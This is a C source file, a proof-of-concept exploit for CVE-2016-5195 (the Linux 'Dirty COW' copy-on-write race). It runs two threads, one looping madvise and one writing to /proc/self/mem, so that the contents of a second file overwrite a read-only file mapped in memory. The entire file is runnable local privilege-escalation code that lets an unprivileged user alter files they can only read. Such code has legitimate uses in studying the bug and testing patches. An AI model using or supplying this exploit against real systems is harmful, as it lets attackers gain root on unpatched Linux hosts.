/*
  This is a proof-of-concept for the CVE-2016-5195 exploit. This exploit uses a race condition bug in the Linux kernel Copy-on-Write to escalate a users's priviliege.

  Based on timwr's PoC -- https://github.com/timwr/
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

struct mem_arg {
	unsigned char *offset;
	unsigned char *patch;
	unsigned char *unpatch;
	size_t patch_size;
};


static void *race_madvise(void *arg) {
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	size    = mem_arg->patch_size;
	addr    = (void *) (mem_arg->offset);

	printf("=> madvise {addr: %p, size: %lu}\n", addr, size);

	for(i = 0; i < 100000; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}

	printf("=> madvise {addr: %d, size: %d}\n", c, i);
	
	return NULL;
}


static void *race_proc_self_mem(void *arg) {
	struct mem_arg *mem_arg;
	int fd, i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	fd = open("/proc/self/mem", O_RDWR);

	for (i = 0; i < 100000; i++) {
		lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
		c += write(fd, mem_arg->patch, mem_arg->patch_size);
	}

	printf("=> /proc/self/mem %d %i\n", c, i);
	close(fd);
	return NULL;
}


static void *exploit(struct mem_arg *mem_arg) {
	pthread_t madvise_thread, procselfmem_thread;

	printf("=> current address %p = %lx\n", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	pthread_create(&madvise_thread, NULL, race_madvise, mem_arg);
	pthread_create(&procselfmem_thread, NULL, race_proc_self_mem, mem_arg);

	pthread_join(madvise_thread, NULL);
	pthread_join(procselfmem_thread, NULL);

	printf("=> exploited %p = %lx\n", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}


int main(int argc, char *argv[]) {
	if (argc < 2) {
		printf("Usage: %s file1 file2\n", argv[0]);
		return 0;
	}

	struct mem_arg mem_arg;
	struct stat file1_stat;
	struct stat file2_stat;

	int file1 = open(argv[1], O_RDONLY);
	if (file1 == -1 || fstat(file1, &file1_stat) == -1) {
		printf("Could not open %s", argv[1]);
		return 0;
	}

	int file2 = open(argv[2], O_RDONLY);
	if (file2 == -1 || fstat(file2, &file2_stat) == -1) {
		printf("Could not open %s", argv[2]);
		return 0;
	}

	size_t size  = file1_stat.st_size;
	int file_num = 1;
	if (file1_stat.st_size != file2_stat.st_size) {
		printf("warning: new file size (%ld) and old file size (%ld) differ\n", file2_stat.st_size, file1_stat.st_size);
		if (file2_stat.st_size > size) {
			size = file2_stat.st_size;
			file_num = 2;
		}
	}

	printf("=> Memory allocation size: %lu (based on file %s)", size, argv[file_num]);

	mem_arg.patch = malloc(size);
	memset(mem_arg.patch, 0, size);
	mem_arg.unpatch = malloc(size);

	read(file2, mem_arg.patch, file2_stat.st_size);
	close(file2);

	mem_arg.patch_size = size;

	/*
	 Open a memory map using the PROT_READ flag and create a private copy-on-write mapping using the MAP_PRIVATE flag.
	 Updates to the mapping are not visible to other processes that are mapping the same file nor are the updates carried
	 through to the underlying file.
	*/
	void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, file1, 0);
	if (map == MAP_FAILED) {
		printf("mmap failed :\\");
		return 0;
	}
	printf("=> mmap %p", map);
	
	mem_arg.offset = map;

	exploit(&mem_arg);

	close(file1);

	return 0;
}
